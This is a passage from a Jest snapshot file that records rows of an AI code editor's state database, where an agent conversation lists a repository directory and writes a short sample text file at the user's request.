\\\\n+ This is a sample file.\\\\n+ You can use this as a template or example.\\\\n  \\",\\"oldStart\\":1,\\"newStart\\":1,\\"oldLines\\":3,\\"newLines\\":3,\\"linesRemoved\\":2,\\"linesAdded\\":2}],\\"editor\\":\\"EDITOR_AI\\"},\\"shouldAutoFixLints\\":true,\\"resultForModel\\":\\"Wrote contents to /Users/jonathanafek/src/autofixer/sample.txt.\\"}"},"checkpointId":"59edd25c-cc77-4b7d-8109-f9ccbf4cdf1a"}",
  },
]
`;

exports[`extension tests > 'full database scenario without thinki…' > full-state.vscdb-getRowsByLike-result-11 1`] = `
[
  {
    "key": "composerData:5ab4c616-183d-498c-a65c-7a2935a9f46c",
    "value": "{"_v":10,"composerId":"5ab4c616-183d-498c-a65c-7a2935a9f46c","richText":"{\\"root\\":{\\"children\\":[{\\"children\\":[],\\"direction\\":null,\\"format\\":\\"\\",\\"indent\\":0,\\"type\\":\\"paragraph\\",\\"version\\":1}],\\"direction\\":null,\\"format\\":\\"\\",\\"indent\\":0,\\"type\\":\\"root\\",\\"version\\":1}}","hasLoaded":true,"text":"","fullConversationHeadersOnly":[{"bubbleId":"eed660a6-b995-4470-a1c3-adfda043c92c","type":1},{"bubbleId":"7e9c54fb-9efb-4a5c-9aeb-d1cf08b84a28","type":2,"serverBubbleId":"480ddba3-6ed5-40a0-bf72-184fa98798e8"},{"bubbleId":"be2f7a3c-7d35-4d2e-972e-712dea4884cb","type":2},{"bubbleId":"9ef5f6bc-4689-4c20-9347-929469e3f36f","type":2},{"bubbleId":"99b6071d-54db-4d5a-907b-b04acdf5a3b9","type":2,"serverBubbleId":"304e9aff-da2e-4380-b44a-0b25253954e0"},{"bubbleId":"54803258-5483-485b-895f-4b0b703781c8","type":2},{"bubbleId":"fda8fd24-131d-48f7-a527-d63fd600c14c","type":2},{"bubbleId":"c53e4c85-dcd2-48e2-86dd-bdcf292af082","type":2,"serverBubbleId":"e93f0ccb-be96-4f32-9431-bc9d8806494d"},{"bubbleId":"5f4c8d99-2985-41df-8607-8ee28cfb890c","type":2}],"conversationMap":{},"status":"completed","context":{"notepads":[],"composers":[],"quotes":[],"selectedCommits":[],"selectedPullRequests":[],"selectedImages":[],"folderSelections":[],"fileSelections":[],"selections":[],"terminalSelections":[],"selectedDocs":[],"externalLinks":[],"cursorRules":[],"cursorCommands":[],"uiElementSelections":[],"consoleLogs":[],"mentions":{"notepads":{},"composers":{},"quotes":{},"selectedCommits":{},"selectedPullRequests":{},"gitDiff":[],"gitDiffFromBranchToMain":[],"selectedImages":{},"useWeb":[],"usePlaywrightMcp":[],"folderSelections":{},"fileSelections":{},"terminalFiles":{},"selections":{},"terminalSelections":{},"selectedDocs":{},"externalLinks":{},"useLinterErrors":[],"useDiffReview":[],"useGenerateRules":[],"useContextPicking":[],"useRememberThis":[],"diffHistory":[],"cursorRules":{},"cursorCommands":{},"autoContext":[],"uiElementSelections":{},"consoleLogs":{},"ideEditorsState":[]}},"gitGraphFileSuggestions":[],"generatingBubbleIds":[],"isReadingLongFile":false,"codeBlockData":{"file:///Users/jonathanafek/src/autofixer/sample.txt":{"e6dce7c8-43e3-466f-8206-8d07703f8333":{"_v":3,"bubbleId":"fda8fd24-131d-48f7-a527-d63fd600c14c","codeBlockIdx":0,"uri":{"$mid":1,"fsPath":"/Users/jonathanafek/src/autofixer/sample.txt","external":"file:///Users/jonathanafek/src/autofixer/sample.txt","path":"/Users/jonathanafek/src/autofixer/sample.txt","scheme":"file"},"codeblockId":"e6dce7c8-43e3-466f-8206-8d07703f8333","status":"accepted","languageId":"plaintext","codeBlockDisplayPreference":"expanded","createdAt":1761735493574,"diffId":"05cd19a8-e34b-4276-96d4-f822c648d6c5","lastDiffId":"82461511-ffca-4e38-b165-256165e1fded","lastAppliedAt":1761735494178}}},"originalFileStates":{"file:///Users/jonathanafek/src/autofixer/sample.txt":{"content":"This is a small text file created in the root of the repository.\\n\\n","firstEditBubbleId":"fda8fd24-131d-48f7-a527-d63fd600c14c","isNewlyCreated":false,"newlyCreatedFolders":[]}},"newlyCreatedFiles":[],"newlyCreatedFolders":[],"lastUpdatedAt":1761735499111,"createdAt":1761735422102,"hasChangedContext":true,"activeTabsShouldBeReactive":true,"capabilities":[{"type":30,"data":{}},{"type":34,"data":{}},{"type":15,"data":{"bubbleDataMap":"{}"}},{"type":22,"data":{}},{"type":18,"data":{}},{"type":19,"data":{}},{"type":33,"data":{}},{"type":32,"data":{}},{"type":23,"data":{}},{"type":6,"data":{}},{"type":16,"data":{}},{"type":24,"data":{}},{"type":25,"data":{}},{"type":21,"data":{}},{"type":31,"data":{}},{"type":29,"data":{}}],"name":"Create a sample file in repo","isFileListExpanded":false,"browserChipManuallyDisabled":false,"browserChipManuallyEnabled":false,"unifiedMode":"agent","forceMode":"edit","usageData":{},"contextUsagePercent":6.6869964599609375,"allAttachedFileCodeChunksUris":[],"modelConfig":{"modelName":"default","maxMode":false},"subComposerIds":[],"capabilityContexts":[],"todos":[],"isTodoListExpanded":false,"isQueueExpanded":true,"hasUnreadMessages":false,"gitHubPromptDismissed":false,"totalLinesAdded":2,"totalLinesRemoved":2,"addedFiles":0,"removedFiles":0,"isArchived":false,"isCreatingWorktree":false,"isApplyingWorktree":false,"pendingCreateWorktree":false,"isSpec":false,"isSpecSubagentDone":false,"speculativeSummarizationEncryptionKey":"UJ2wmMB/g6T6cVl7r+sbdSgiY/tHFMG8QdzqGaTqNQU=","latestChatGenerationUUID":"701535c0-1c34-44e5-8d68-af1b2caa300b","isAgentic":true,"subtitle":"sample.txt"}",
  },
  {
    "key": "composerData:fad3fba8-79b6-47f0-8dd1-3d0f63b93894",
    "value": "{"_v":10,"composerId":"fad3fba8-79b6-47f0-8dd1-3d0f63b93894","richText":"{\\"root\\":{\\"children\\":[{\\"children\\":[],\\"format\\":\\"\\",\\"indent\\":0,\\"type\\":\\"paragraph\\",\\"version\\":1}],\\"format\\":\\"\\",\\"indent\\":0,\\"type\\":\\"root\\",\\"version\\":1}}","hasLoaded":true,"text":"","fullConversationHeadersOnly":[{"bubbleId":"faa831d8-b66b-4f1d-a665-e8aa97c1a2fb","type":1},{"bubbleId":"1ff873e6-9a94-425d-9c0e-4da7fefa9125","type":2,"serverBubbleId":"86749afc-2a34-4ae7-980d-925eab2cdb74"},{"bubbleId":"8e03beb6-b73e-4f01-8a06-718e8f97c94c","type":2},{"bubbleId":"aa6dde5d-42f1-45f6-8771-3fadafcbbc1c","type":2},{"bubbleId":"5d86d361-94a4-4bf5-a434-f49944de5e01","type":2,"serverBubbleId":"e1f88d9c-f268-4c60-bde8-0c3ace83df24"},{"bubbleId":"9675c9bc-9f1f-470a-ac77-80770a3125a2","type":2},{"bubbleId":"8c99ec18-c2ce-4d2a-b202-077197c8c688","type":2},{"bubbleId":"76374f35-18d7-43dc-8885-14ecfe3b08d3","type":2,"serverBubbleId":"05ed1c04-1909-4342-aa96-d86c6ff6f3bf"},{"bubbleId":"ebceae0f-7d95-488e-ae81-51ac815330f3","type":2}],"conversationMap":{},"status":"completed","context":{"composers":[],"quotes":[],"selectedCommits":[],"selectedPullRequests":[],"selectedImages":[],"folderSelections":[],"fileSelections":[],"selections":[],"terminalSelections":[],"selectedDocs":[],"externalLinks":[],"cursorRules":[],"cursorCommands":[],"uiElementSelections":[],"consoleLogs":[],"ideEditorsState":true,"mentions":{"notepads":{},"composers":{},"quotes":{},"selectedCommits":{},"selectedPullRequests":{},"gitDiff":[],"gitDiffFromBranchToMain":[],"selectedImages":{},"useWeb":[],"usePlaywrightMcp":[],"folderSelections":{},"fileSelections":{},"terminalFiles":{},"selections":{},"terminalSelections":{},"selectedDocs":{},"externalLinks":{},"useLinterErrors":[],"useDiffReview":[],"useGenerateRules":[],"useContextPicking":[],"useRememberThis":[],"diffHistory":[],"cursorRules":{},"cursorCommands":{},"autoContext":[],"uiElementSelections":{},"consoleLogs":{},"ideEditorsState":[]},"notepads":[]},"gitGraphFileSuggestions":[],"generatingBubbleIds":[],"isReadingLongFile":false,"codeBlockData":{"file:///Users/jonathanafek/src/autofixer/sample.txt":{"004eb2b8-d56c-4c39-b0ff-36eaa9d6153b":{"_v":3,"bubbleId":"8c99ec18-c2ce-4d2a-b202-077197c8c688","codeBlockIdx":0,"uri":{"$mid":1,"fsPath":"/Users/jonathanafek/src/autofixer/sample.txt","external":"file:///Users/jonathanafek/src/autofixer/sample.txt","path":"/Users/jonathanafek/src/autofixer/sample.txt","scheme":"file"},"codeblockId":"004eb2b8-d56c-4c39-b0ff-36eaa9d6153b","status":"accepted","languageId":"plaintext","chainedInfo":{"chainedFromCodeblockId":"e6dce7c8-43e3-466f-8206-8d07703f8333","composerId":"5ab4c616-183d-498c-a65c-7a2935a9f46c"},"codeBlockDisplayPreference":"expanded","createdAt":1761735692585,"diffId":"811e3241-fc58-45e4-8d1d-c79d80f2418a","lastDiffId":"f2f5031a-1b8f-43ae-96f4-145bba0bef29","lastAppliedAt":1761735693299}}},"originalFileStates":{"file:///Users/jonathanafek/src/autofixer/sample.txt":{"content":"This is a sample file.\\nYou can use this as a template or example.\\n","firstEditBubbleId":"8c99ec18-c2ce-4d2a-b202-077197c8c688","isNewlyCreated":false,"newlyCreatedFolders":[]}},"newlyCreatedFiles":[],"newlyCreatedFolders":[],"lastUpdatedAt":1761735695738,"createdAt":1761735667190,"hasChangedContext":true,"activeTabsShouldBeReactive":true,"capabilities":[{"type":30,"data":{}},{"type":34,"data":{}},{"type":15,"data":{"bubbleDataMap":"{}"}},{"type":22,"data":{}},{"type":18,"data":{}},{"type":19,"data":{}},{"type":33,"data":{}},{"type":32,"data":{}},{"type":23,"data":{}},{"type":6,"data":{}},{"type":16,"data":{}},{"type":24,"data":{}},{"type":25,"data":{}},{"type":21,"data":{}},{"type":31,"data":{}},{"type":29,"data":{}}],"name":"let's create a sample file in the root of this","isFileListExpanded":false,"browserChipManuallyDisabled":false,"browserChipManuallyEnabled":false,"unifiedMode":"agent","forceMode":"edit","usageData":{},"contextUsagePercent":6.59649658203125,"allAttachedFileCodeChunksUris":[],"modelConfig":{"modelName":"default","maxMode":false},"subComposerIds":[],"capabilityContexts":[],"todos":[],"isTodoListExpanded":false,"isQueueExpanded":true,"hasUnreadMessages":false,"gitHubPromptDismissed":false,"totalLinesAdded":3,"totalLinesRemoved":2,"addedFiles":0,"removedFiles":0,"isArchived":false,"isDraft":false,"isCreatingWorktree":false,"isApplyingWorktree":false,"isUndoingWorktree":false,"pendingCreateWorktree":false,"isBestOfNSubcomposer":false,"isBestOfNParent":false,"isSpec":false,"isSpecSubagentDone":false,"stopHookLoopCount":0,"speculativeSummarizationEncryptionKey":"an/R9lkAJiLihQHjbjydJ70Bvl2/FMmB4ghYjmn4GBA=","isNAL":false,"planModeSuggestionUsed":false,"latestChatGenerationUUID":"3e63f2d6-7fb2-4c73-8f71-434a9916941b","isAgentic":true,"subtitle":"sample.txt","filesChangedCount":1}",
  },
]
`;

exports[`extension tests > 'full database scenario without thinki…' > full-state.vscdb-getRowsByLike-result-12 1`] = `
[
  {
    "key": "bubbleId:5ab4c616-183d-498c-a65c-7a2935a9f46c:eed660a6-b995-4470-a1c3-adfda043c92c",
    "value": "{"_v":3,"type":1,"approximateLintErrors":[],"lints":[],"codebaseContextChunks":[],"commits":[],"pullRequests":[],"attachedCodeChunks":[],"assistantSuggestedDiffs":[],"gitDiffs":[],"interpreterResults":[],"images":[],"attachedFolders":[],"attachedFoldersNew":[],"bubbleId":"eed660a6-b995-4470-a1c3-adfda043c92c","userResponsesToSuggestedCodeBlocks":[],"suggestedCodeBlocks":[],"diffsForCompressingFiles":[],"relevantFiles":[],"toolResults":[],"notepads":[],"capabilities":[],"capabilityStatuses":{"mutate-request":[],"start-submit-chat":[],"before-submit-chat":[],"chat-stream-finished":[],"before-apply":[],"after-apply":[],"accept-all-edits":[],"composer-done":[],"process-stream":[],"add-pending-action":[]},"multiFileLinterErrors":[],"diffHistories":[],"recentLocationsHistory":[],"recentlyViewedFiles":[],"isAgentic":true,"fileDiffTrajectories":[],"existedSubsequentTerminalCommand":false,"existedPreviousTerminalCommand":false,"docsReferences":[],"webReferences":[],"aiWebSearchResults":[],"requestId":"701535c0-1c34-44e5-8d68-af1b2caa300b","attachedFoldersListDirResults":[],"humanChanges":[],"attachedHumanChanges":false,"summarizedComposers":[],"cursorRules":[],"contextPieces":[],"editTrailContexts":[],"allThinkingBlocks":[],"diffsSinceLastApply":[],"deletedFiles":[],"supportedTools":[1,3,41,5,6,7,38,8,9,11,12,15,16,18,19,23,24,25,27,28,43,29,30,31,32,34,35,39,40,42,44,45],"tokenCount":{"inputTokens":0,"outputTokens":0},"attachedFileCodeChunksMetadataOnly":[],"consoleLogs":[],"uiElementPicked":[],"isRefunded":false,"knowledgeItems":[],"documentationSelections":[],"externalLinks":[],"useWeb":false,"projectLayouts":[],"unifiedMode":2,"capabilityContexts":[],"todos":[],"createdAt":"2025-10-29T10:58:04.270Z","isQuickSearchQuery":false,"richText":"{\\"root\\":{\\"children\\":[{\\"children\\":[{\\"detail\\":0,\\"format\\":0,\\"mode\\":\\"normal\\",\\"style\\":\\"\\",\\"text\\":\\"let's create a smaple file in the root of the repo\\",\\"type\\":\\"text\\",\\"version\\":1}],\\"direction\\":\\"ltr\\",\\"format\\":\\"\\",\\"indent\\":0,\\"type\\":\\"paragraph\\",\\"version\\":1}],\\"direction\\":\\"ltr\\",\\"format\\":\\"\\",\\"indent\\":0,\\"type\\":\\"root\\",\\"version\\":1}}","text":"let's create a smaple file in the root of the repo","editToolSupportsSearchAndReplace":true,"modelInfo":{"modelName":"default"},"isNudge":false,"skipRendering":false,"isPlanExecution":false,"context":{"notepads":[],"composers":[],"quotes":[],"selectedCommits":[],"selectedPullRequests":[],"selectedImages":[],"folderSelections":[],"fileSelections":[],"terminalFiles":[],"selections":[],"terminalSelections":[],"selectedDocs":[],"externalLinks":[],"cursorRules":[],"cursorCommands":[],"uiElementSelections":[],"consoleLogs":[],"mentions":{"notepads":{},"composers":{},"quotes":{},"selectedCommits":{},"selectedPullRequests":{},"gitDiff":[],"gitDiffFromBranchToMain":[],"selectedImages":{},"useWeb":[],"usePlaywrightMcp":[],"folderSelections":{},"fileSelections":{},"terminalFiles":{},"selections":{},"terminalSelections":{},"selectedDocs":{},"externalLinks":{},"useLinterErrors":[],"useDiffReview":[],"useGenerateRules":[],"useContextPicking":[],"useRememberThis":[],"diffHistory":[],"cursorRules":{},"cursorCommands":{},"autoContext":[],"uiElementSelections":{},"consoleLogs":{},"ideEditorsState":[]}},"checkpointId":"11bbc2e4-1a18-4b12-a755-40e01b98f9cc"}",
  },
]
`;

exports[`extension tests > 'full database scenario without thinki…' > full-state.vscdb-getRowsByLike-result-13 1`] = `
[
  {
    "key": "bubbleId:5ab4c616-183d-498c-a65c-7a2935a9f46c:7e9c54fb-9efb-4a5c-9aeb-d1cf08b84a28",
    "value": "{"_v":3,"type":2,"approximateLintErrors":[],"lints":[],"codebaseContextChunks":[],"commits":[],"pullRequests":[],"attachedCodeChunks":[],"assistantSuggestedDiffs":[],"gitDiffs":[],"interpreterResults":[],"images":[],"attachedFolders":[],"attachedFoldersNew":[],"bubbleId":"7e9c54fb-9efb-4a5c-9aeb-d1cf08b84a28","userResponsesToSuggestedCodeBlocks":[],"suggestedCodeBlocks":[],"diffsForCompressingFiles":[],"relevantFiles":[],"toolResults":[],"notepads":[],"capabilities":[],"capabilityStatuses":{"mutate-request":[],"start-submit-chat":[],"before-submit-chat":[],"chat-stream-finished":[],"before-apply":[],"after-apply":[],"accept-all-edits":[],"composer-done":[],"process-stream":[],"add-pending-action":[]},"multiFileLinterErrors":[],"diffHistories":[],"recentLocationsHistory":[],"recentlyViewedFiles":[],"isAgentic":false,"fileDiffTrajectories":[],"existedSubsequentTerminalCommand":false,"existedPreviousTerminalCommand":false,"docsReferences":[],"webReferences":[],"aiWebSearchResults":[],"requestId":"701535c0-1c34-44e5-8d68-af1b2caa300b","attachedFoldersListDirResults":[],"humanChanges":[],"attachedHumanChanges":false,"summarizedComposers":[],"cursorRules":[],"contextPieces":[],"editTrailContexts":[],"allThinkingBlocks":[],"diffsSinceLastApply":[],"deletedFiles":[],"supportedTools":[],"tokenCount":{"inputTokens":0,"outputTokens":0},"attachedFileCodeChunksMetadataOnly":[],"consoleLogs":[],"uiElementPicked":[],"isRefunded":false,"knowledgeItems":[],"documentationSelections":[],"externalLinks":[],"useWeb":false,"projectLayouts":[],"unifiedMode":2,"capabilityContexts":[],"todos":[],"createdAt":"2025-10-29T10:58:04.298Z","isQuickSearchQuery":false,"codeBlocks":[],"text":"","modelInfo":{"modelName":"default"},"timingInfo":{"clientStartTime":62920.79999999702,"clientRpcSendTime":1761735484298,"clientSettleTime":1761735499158,"clientEndTime":1761735499158},"serverBubbleId":"480ddba3-6ed5-40a0-bf72-184fa98798e8","usageUuid":"701535c0-1c34-44e5-8d68-af1b2caa300b","capabilityType":30,"thinking":{"text":"","signature":"xVs7ZEExmhQUFnVUIUP2np1fyTaEPsdKyiZcrM7rGkK6xhCGjeaCM8j-IYybQzUYYq2yQ83GQttHIZ-pepIZrwYn0cgIxAQFi39QpiTGzZmGyxsoQGm87nwp_V0aDltIIr9k8G9GVcBKmU2Cue63I7XbgqHi_pzVd_9zKXg9YTD2DSPYKy9bNf3NbkRI0LWGnQf51_gyEr1bL7pBnZxXPlBYNJCEL8uInXrmp_uPCUlVrYzRbT0Cje77EodsuiuQxABOQPIBAusoiPvyxc-um9x1H080brrzzzFkk0tF866c5v7vwoxU3IZcTrufNeTGptbcLYcFhl2ZwqmAzSJ0iuPnhPd0cEIJ3P9O7RTJ7qjlTYL9KsiSIS9APESoo_2l4PYPBKvyq8o3nlK-QYEzylzgAR2k9bRw1KPS2VOlbgFkv2HNoI4NXsyI89k-URdZ6H_GdvE7sGxzmaAz-vJfF5sfAD14o1w_mTCpE67jVN-cN75qUyHKia0tJgYm4yeFzICzuxvcJApIAd_Ya1ckMETj4tW640I6QsiXg3HUogHEIRVE8GIeJZBTI0xJ_X0AqxwIyq4EpXQlOlzKkdL_Waz34RQ9mjymaFOapYYGPZIZ5pxTILlYwRRvx5SjmhKbG5UdUmzs7HAU8C6g_NxblzAbqavXbO1YGhkuGAyWoigblJ9fVVLOLyKX574nHZ6GzafHHC26zwu99RaTJJbCftxAjHugIL_4l8z8lpzx3WPtbQbRurMBe1UAmMff5dKxU1QZzVRub3amRYkKXSmLw9UW4pWLkmc4Eo0VtxZO1CwiAT02HMvOAwR6Zn8_8kxS4RL-A-zolZljC7VnXHfwgYDLeorDft77tcNdRp9ZrRf6i0rtUXfI-UKiB9PgXDt6PlqDHSvJPBnf1yCMw2Q"},"thinkingDurationMs":2794}",
  },
]
`;

exports[`extension tests > 'full database scenario without thinki…' > full-state.vscdb-getRowsByLike-result-14 1`] = `
[
  {
    "key": "bubbleId:5ab4c616-183d-498c-a65c-7a2935a9f46c:be2f7a3c-7d35-4d2e-972e-712dea4884cb",
    "value": "{"_v":3,"type":2,"approximateLintErrors":[],"lints":[],"codebaseContextChunks":[],"commits":[],"pullRequests":[],"attachedCodeChunks":[],"assistantSuggestedDiffs":[],"gitDiffs":[],"interpreterResults":[],"images":[],"attachedFolders":[],"attachedFoldersNew":[],"bubbleId":"be2f7a3c-7d35-4d2e-972e-712dea4884cb","userResponsesToSuggestedCodeBlocks":[],"suggestedCodeBlocks":[],"diffsForCompressingFiles":[],"relevantFiles":[],"toolResults":[],"notepads":[],"capabilities":[],"capabilityStatuses":{"mutate-request":[],"start-submit-chat":[],"before-submit-chat":[],"chat-stream-finished":[],"before-apply":[],"after-apply":[],"accept-all-edits":[],"composer-done":[],"process-stream":[],"add-pending-action":[]},"multiFileLinterErrors":[],"diffHistories":[],"recentLocationsHistory":[],"recentlyViewedFiles":[],"isAgentic":false,"fileDiffTrajectories":[],"existedSubsequentTerminalCommand":false,"existedPreviousTerminalCommand":false,"docsReferences":[],"webReferences":[],"aiWebSearchResults":[],"requestId":"","attachedFoldersListDirResults":[],"humanChanges":[],"attachedHumanChanges":false,"summarizedComposers":[],"cursorRules":[],"contextPieces":[],"editTrailContexts":[],"allThinkingBlocks":[],"diffsSinceLastApply":[],"deletedFiles":[],"supportedTools":[],"tokenCount":{"inputTokens":0,"outputTokens":0},"attachedFileCodeChunksMetadataOnly":[],"consoleLogs":[],"uiElementPicked":[],"isRefunded":false,"knowledgeItems":[],"documentationSelections":[],"externalLinks":[],"useWeb":false,"projectLayouts":[],"unifiedMode":2,"capabilityContexts":[],"todos":[],"createdAt":"2025-10-29T10:58:08.822Z","isQuickSearchQuery":false,"text":"Checking the repo root, then creating a sample file.\\n","usageUuid":"701535c0-1c34-44e5-8d68-af1b2caa300b"}",
  },
]
`;

exports[`extension tests > 'full database scenario without thinki…' > full-state.vscdb-getRowsByLike-result-15 1`] = `
[
  {
    "key": "bubbleId:5ab4c616-183d-498c-a65c-7a2935a9f46c:9ef5f6bc-4689-4c20-9347-929469e3f36f",
    "value": "{"_v":3,"type":2,"approximateLintErrors":[],"lints":[],"codebaseContextChunks":[],"commits":[],"pullRequests":[],"attachedCodeChunks":[],"assistantSuggestedDiffs":[],"gitDiffs":[],"interpreterResults":[],"images":[],"attachedFolders":[],"attachedFoldersNew":[],"bubbleId":"9ef5f6bc-4689-4c20-9347-929469e3f36f","userResponsesToSuggestedCodeBlocks":[],"suggestedCodeBlocks":[],"diffsForCompressingFiles":[],"relevantFiles":[],"toolResults":[],"notepads":[],"capabilities":[],"capabilityStatuses":{"mutate-request":[],"start-submit-chat":[],"before-submit-chat":[],"chat-stream-finished":[],"before-apply":[],"after-apply":[],"accept-all-edits":[],"composer-done":[],"process-stream":[],"add-pending-action":[]},"multiFileLinterErrors":[],"diffHistories":[],"recentLocationsHistory":[],"recentlyViewedFiles":[],"isAgentic":false,"fileDiffTrajectories":[],"existedSubsequentTerminalCommand":false,"existedPreviousTerminalCommand":false,"docsReferences":[],"webReferences":[],"aiWebSearchResults":[],"requestId":"","attachedFoldersListDirResults":[],"humanChanges":[],"attachedHumanChanges":false,"summarizedComposers":[],"cursorRules":[],"contextPieces":[],"editTrailContexts":[],"allThinkingBlocks":[],"diffsSinceLastApply":[],"deletedFiles":[],"supportedTools":[],"tokenCount":{"inputTokens":0,"outputTokens":0},"attachedFileCodeChunksMetadataOnly":[],"consoleLogs":[],"uiElementPicked":[],"isRefunded":false,"knowledgeItems":[],"documentationSelections":[],"externalLinks":[],"useWeb":false,"projectLayouts":[],"unifiedMode":2,"capabilityContexts":[],"todos":[],"createdAt":"2025-10-29T10:58:08.916Z","isQuickSearchQuery":false,"codeBlocks":[],"text":"","capabilityType":15,"toolFormerData":{"tool":39,"toolIndex":1,"modelCallId":"9cbdc25c-a03d-49c1-b882-216377a93e32","toolCallId":"tool_48944975-7418-49d1-8474-e745030b819","status":"completed","rawArgs":"{\\"target_directory\\": \\"/Users/jonathanafek/src/autofixer\\"}","name":"list_dir","params":"{\\"targetDirectory\\":\\"/Users/jonathanafek/src/autofixer\\"}","additionalData":{},"result":"{\\"directoryTreeRoot\\":{\\"absPath\\":\\"/Users/jonathanafek/src/autofixer\\",\\"childrenDirs\\":[{\\"absPath\\":\\"/Users/jonathanafek/src/autofixer/__playwright__\\",\\"childrenDirs\\":[{\\"absPath\\":\\"/Users/jonathanafek/src/autofixer/__playwright__/build\\"},{\\"absPath\\":\\"/Users/jonathanafek/src/autofixer/__playwright__/fixtures\\"},{\\"absPath\\":\\"/Users/jonathanafek/src/autofixer/__playwright__/graphql\\"},{\\"absPath\\":\\"/Users/jonathanafek/src/autofixer/__playwright__/helpers\\"},{\\"absPath\\":\\"/Users/jonathanafek/src/autofixer/__playwright__/node_modules\\"},{\\"absPath\\":\\"/Users/jonathanafek/src/autofixer/__playwright__/pages\\"},{\\"absPath\\":\\"/Users/jonathanafek/src/autofixer/__playwright__/playwright-report\\"},{\\"absPath\\":\\"/Users/jonathanafek/src/autofixer/__playwright__/settings\\"},{\\"absPath\\":\\"/Users/jonathanafek/src/autofixer/__playwright__/test-results\\"},{\\"absPath\\":\\"/Users/jonathanafek/src/autofixer/__playwright__/tests\\"}],\\"childrenFiles\\":[{\\"name\\":\\"generated.ts\\"},{\\"name\\":\\"graphql.config.ts\\"},{\\"name\\":\\"package.json\\"},{\\"name\\":\\"playwright.config.ts\\"},{\\"name\\":\\"precommit-format.sh\\"},{\\"name\\":\\"tsconfig.json\\"}],\\"childrenWereProcessed\\":true},{\\"absPath\\":\\"/Users/jonathanafek/src/autofixer/__tests__\\",\\"childrenDirs\\":[{\\"absPath\\":\\"/Users/jonathanafek/src/autofixer/__tests__/build\\"},{\\"absPath\\":\\"/Users/jonathanafek/src/autofixer/__tests__/constants\\"},{\\"absPath\\":\\"/Users/jonathanafek/src/autofixer/__tests__/files\\"},{\\"absPath\\":\\"/Users/jonathanafek/src/autofixer/__tests__/graphql\\"},{\\"absPath\\":\\"/Users/jonathanafek/src/autofixer/__tests__/helpers\\"},{\\"absPath\\":\\"/Users/jonathanafek/src/autofixer/__tests__/node_modules\\"},{\\"absPath\\":\\"/Users/jonathanafek/src/autofixer/__tests__/settings\\"},{\\"absPath\\":\\"/Users/jonathanafek/src/autofixer/__tests__/setup\\"},{\\"absPath\\":\\"/Users/jonathanafek/src/autofixer/__tests__/tests\\"}],\\"childrenFiles\\":[{\\"name\\":\\"generated.ts\\"},{\\"name\\":\\"graphql.config.ts\\"},{\\"name\\":\\"index.d.ts\\"},{\\"name\\":\\"jest.config.ts\\"},{\\"name\\":\\"package.json\\"},{\\"name\\":\\"precommit-format.sh\\"},{\\"name\\":\\"tsconfig.json\\"}],\\"childrenWereProcessed\\":true},{\\"absPath\\":\\"/Users/jonathanafek/src/autofixer/build\\",\\"childrenDirs\\":[{\\"absPath\\":\\"/Users/jonathanafek/src/autofixer/build/litellm\\"}],\\"childrenWereProcessed\\":true},{\\"absPath\\":\\"/Users/jonathanafek/src/autofixer/clients\\",\\"childrenDirs\\":[{\\"absPath\\":\\"/Users/jonathanafek/src/autofixer/clients/cli\\"},{\\"absPath\\":\\"/Users/jonathanafek/src/autofixer/clients/copilot_ext\\"},{\\"absPath\\":\\"/Users/jonathanafek/src/autofixer/clients/cursor_ext\\"}],\\"childrenWereProcessed\\":true},{\\"absPath\\":\\"/Users/jonathanafek/src/autofixer/consumers\\",\\"childrenDirs\\":[{\\"absPath\\":\\"/Users/jonathanafek/src/autofixer/consumers/analyzer\\"},{\\"absPath\\":\\"/Users/jonathanafek/src/autofixer/consumers/blame_ai_agent\\"},{\\"absPath\\":\\"/Users/jonathanafek/src/autofixer/consumers/maintenance_service\\"},{\\"absPath\\":\\"/Users/jonathanafek/src/autofixer/consumers/notifier\\"},{\\"absPath\\":\\"/Users/jonathanafek/src/autofixer/consumers/report_init\\"},{\\"absPath\\":\\"/Users/jonathanafek/src/autofixer/consumers/sast_report_parser\\"},{\\"absPath\\":\\"/Users/jonathanafek/src/autofixer/consumers/scan_agent\\"},{\\"absPath\\":\\"/Users/jonathanafek/src/autofixer/consumers/scm_agent\\"}],\\"childrenWereProcessed\\":true},{\\"absPath\\":\\"/Users/jonathanafek/src/autofixer/data_migrations\\",\\"childrenDirs\\":[{\\"absPath\\":\\"/Users/jonathanafek/src/autofixer/data_migrations/node_modules\\"}],\\"childrenFiles\\":[{\\"name\\":\\"package.json\\"},{\\"name\\":\\"tsconfig.json\\"}],\\"childrenWereProcessed\\":true},{\\"absPath\\":\\"/Users/jonathanafek/src/autofixer/dist\\",\\"childrenFiles\\":[{\\"name\\":\\"litellm\\"}],\\"childrenWereProcessed\\":true},{\\"absPath\\":\\"/Users/jonathanafek/src/autofixer/docs\\",\\"childrenDirs\\":[{\\"absPath\\":\\"/Users/jonathanafek/src/autofixer/docs/cheat_sheets\\"}],\\"childrenFiles\\":[{\\"name\\":\\"auth.md\\"},{\\"name\\":\\"system.md\\"},{\\"name\\":\\"system.png\\"}],\\"childrenWereProcessed\\":true},{\\"absPath\\":\\"/Users/jonathanafek/src/autofixer/downloads\\"},{\\"absPath\\":\\"/Users/jonathanafek/src/autofixer/infrastructure\\",\\"childrenDirs\\":[{\\"absPath\\":\\"/Users/jonathanafek/src/autofixer/infrastructure/pulumi\\"},{\\"absPath\\":\\"/Users/jonathanafek/src/autofixer/infrastructure/web-workers\\"}],\\"childrenWereProcessed\\":true},{\\"absPath\\":\\"/Users/jonathanafek/src/autofixer/migrations\\",\\"childrenDirs\\":[{\\"absPath\\":\\"/Users/jonathanafek/src/autofixer/migrations/default\\"}],\\"childrenWereProcessed\\":true},{\\"absPath\\":\\"/Users/jonathanafek/src/autofixer/monitoring\\",\\"childrenDirs\\":[{\\"absPath\\":\\"/Users/jonathanafek/src/autofixer/monitoring/grafana\\"},{\\"absPath\\":\\"/Users/jonathanafek/src/autofixer/monitoring/postgres\\"},{\\"absPath\\":\\"/Users/jonathanafek/src/autofixer/monitoring/postgres-exporter\\"},{\\"absPath\\":\\"/Users/jonathanafek/src/autofixer/monitoring/prometheus\\"}],\\"childrenFiles\\":[{\\"name\\":\\"README.md\\"}],\\"childrenWereProcessed\\":true},{\\"absPath\\":\\"/Users/jonathanafek/src/autofixer/node_modules\\"},{\\"absPath\\":\\"/Users/jonathanafek/src/autofixer/patchino\\"},{\\"absPath\\":\\"/Users/jonathanafek/src/autofixer/pycommon\\"},{\\"absPath\\":\\"/Users/jonathanafek/src/autofixer/scripts\\"},{\\"absPath\\":\\"/Users/jonathanafek/src/autofixer/services\\"},{\\"absPath\\":\\"/Users/jonathanafek/src/autofixer/tscommon\\"}],\\"childrenFiles\\":[{\\"name\\":\\"CLAUDE.md\\"},{\\"name\\":\\"cspell.